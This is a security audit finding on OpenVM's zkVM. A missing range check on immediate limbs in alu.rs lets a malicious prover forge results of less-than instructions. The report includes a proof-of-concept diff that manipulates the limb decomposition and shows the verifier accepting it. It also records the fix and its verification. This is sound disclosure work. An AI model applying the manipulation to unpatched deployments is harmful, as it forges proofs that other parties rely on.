---
tags:
  - severity/high
  - has/poc
  - lang/rust
  - sector/zk
  - platform/cantina
protocol: "[[OpenVM]]"
auditors:
  - georg
report: "https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf"
genome:
  - "[[circuit-input-range-check]]"
  - "[[integer-bounds]]"
  - "[[input-validation/missing]]"
  - "[[data-corruption/state-manipulation]]"
  - "[[known-pattern]]"
  - "[[always]]"
  - "[[add-check]]"
  - "[[blast-radius/protocol-wide]]"
---
# Immediate limbs not range-checked 

- id: 53419
- impact: HIGH
- protocol: OpenVM
- reporter: georg (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf

## Summary


The report discusses a vulnerability in a file called alu.rs, specifically on line 136. This vulnerability allows a malicious user to manipulate the arguments of certain instructions, potentially changing the flow of the program. This can be done by providing out-of-range limbs, as long as they satisfy a specific equation. This issue is likely to affect most programs written in Rust. A proof of concept is provided to demonstrate this vulnerability. The recommendation is to add missing range-checks to fix the issue. The vulnerability has been fixed in a commit called 1f99a346, and Cantina Managed has verified the fix. 

## Details

## Context
alu.rs#L136

## Summary
A missing range constraint allows a malicious prover to provide wrong "byte"-decompositions of immediate values.

## Finding Description
In `Rv32BaseAluAdapterAir`, there is a constraint that should ensure that `local.rs2` (coming from the program) is byte-decomposed into the second read of the core chip. However, these limbs are never range-checked. This allows the prover to provide out-of-range limbs, as long as they satisfy:

```
limb[0] + 2**8 * limb[1] + 2**16 * limb[2] + 2**24 * limb[3] == rs2
```

## Impact Explanation
This lets a prover manipulate the arguments to some instructions (ALU instructions with immediate arguments), changing the flow of the program. For example, in the "less than" instruction, a malicious prover could change the value of the most significant byte, altering the result.

## Likelihood Explanation
It seems very likely that most Rust programs would be affected.

## Proof of Concept
This simple PoC validates that the verifier does not reject an out-of-range decomposition. To test, apply the following diff to the OpenVM repo, install, and run the Fibonacci example with input `0x1000000000000000`.

```diff
diff --git a/extensions/rv32im/circuit/src/adapters/alu.rs b/extensions/rv32im/circuit/src/adapters/alu.rs
index 097e19a28..ef0840a5e 100644
--- a/extensions/rv32im/circuit/src/adapters/alu.rs
+++ b/extensions/rv32im/circuit/src/adapters/alu.rs
@@ -39,6 +39,7 @@ use super::{RV32_CELL_BITS, RV32_REGISTER_NUM_LIMBS};
#[derive(Debug)]
pub struct Rv32BaseAluAdapterChip<F: Field> {
pub air: Rv32BaseAluAdapterAir,
+ manipulate_limbs: bool,
_marker: PhantomData<F>,
}
@@ -47,12 +48,14 @@ impl<F: PrimeField32> Rv32BaseAluAdapterChip<F> {
execution_bus: ExecutionBus,
program_bus: ProgramBus,
memory_bridge: MemoryBridge,
+ manipulate_limbs: bool,
) -> Self {
Self {
air: Rv32BaseAluAdapterAir {
execution_bridge: ExecutionBridge::new(execution_bus, program_bus),
memory_bridge,
},
+ manipulate_limbs,
_marker: PhantomData,
}
}
@@ -228,17 +231,31 @@ impl<F: PrimeField32> VmAdapterChip<F> for Rv32BaseAluAdapterChip<F> {
let c_u32 = c.as_canonical_u32();
debug_assert_eq!(c_u32 >> 24, 0);
memory.increment_timestamp();
- (
- None,
- [
- c_u32 as u8,
- (c_u32 >> 8) as u8,
- (c_u32 >> 16) as u8,
- (c_u32 >> 16) as u8,
- ]
- .map(F::from_canonical_u8),
- c,
- )
+ let mut decomposition = [
+ c_u32 & 0xff,
+ (c_u32 >> 8) & 0xff,
+ (c_u32 >> 16) & 0xff,
+ (c_u32 >> 16) & 0xff,
+ ];
+ if self.manipulate_limbs {
+ println!("Manipulating limbs of immediate: 0x{:x}", c_u32);
+ println!("{:?}", instruction);
+ // Subtract 256 from LSB, add 1 to the next byte
+ // => limb[0] + 2^8 * limb[1] + 2^16 * limb[2] + 2^24 * limb[3] = c_u32
+ // Still satisfied!
+ let p = (1 << 31) - (1 << 27) + 1;
+ decomposition[0] = p - 256 + decomposition[0];
+ decomposition[1] += 1;
+ println!(
+ " => [{}]",
+ decomposition
+ .iter()
+ .map(|x| format!("0x{:x}", x))
+ .collect::<Vec<_>>()
+ .join(", ")
+ );
+ }
+ (None, decomposition.map(F::from_canonical_u32), c)
} else {
let rs2_read = memory.read::<RV32_REGISTER_NUM_LIMBS>(e, c);
(Some(rs2_read.0), rs2_read.1, F::ZERO)
diff --git a/extensions/rv32im/circuit/src/extension.rs b/extensions/rv32im/circuit/src/extension.rs
index 0bb6ff75a..bcb1ffa3d 100644
--- a/extensions/rv32im/circuit/src/extension.rs
+++ b/extensions/rv32im/circuit/src/extension.rs
@@ -214,7 +214,7 @@ impl<F: PrimeField32> VmExtension<F> for Rv32I {
};
let base_alu_chip = Rv32BaseAluChip::new(
- Rv32BaseAluAdapterChip::new(execution_bus, program_bus, memory_bridge),
+ Rv32BaseAluAdapterChip::new(execution_bus, program_bus, memory_bridge, false),
BaseAluCoreChip::new(bitwise_lu_chip.clone(), BaseAluOpcode::CLASS_OFFSET),
offline_memory.clone(),
);
@@ -224,14 +224,14 @@ impl<F: PrimeField32> VmExtension<F> for Rv32I {
)?;
let lt_chip = Rv32LessThanChip::new(
- Rv32BaseAluAdapterChip::new(execution_bus, program_bus, memory_bridge),
+ Rv32BaseAluAdapterChip::new(execution_bus, program_bus, memory_bridge, true),
LessThanCoreChip::new(bitwise_lu_chip.clone(), LessThanOpcode::CLASS_OFFSET),
offline_memory.clone(),
);
inventory.add_executor(lt_chip, LessThanOpcode::iter().map(|x| x.global_opcode()))?;
let shift_chip = Rv32ShiftChip::new(
- Rv32BaseAluAdapterChip::new(execution_bus, program_bus, memory_bridge),
+ Rv32BaseAluAdapterChip::new(execution_bus, program_bus, memory_bridge, false),
ShiftCoreChip::new(
bitwise_lu_chip.clone(),
range_checker.clone(),
```

This does manipulate a few arguments to the "Less Than" chip, but the proof is accepted by the verifier:

```
Manipulating limbs: 0x1
Instruction { opcode: VmOpcode(521), a: 68, b: 56, c: 1, d: 1, e: 0, f: 0, g: 0 }
=> [0x77ffff02, 0x1, 0x0, 0x0]
```

## Recommendation
Add the missing range-checks.

## OpenVM
Fixed in commit `1f99a346`, the fix adds the missing range-checks by adding `bitwise_lookup_chip` as a field to the adapter chip, then using it to range-check limbs instead of using `VariableRangeChecker`.

## Cantina Managed
Fix verified.
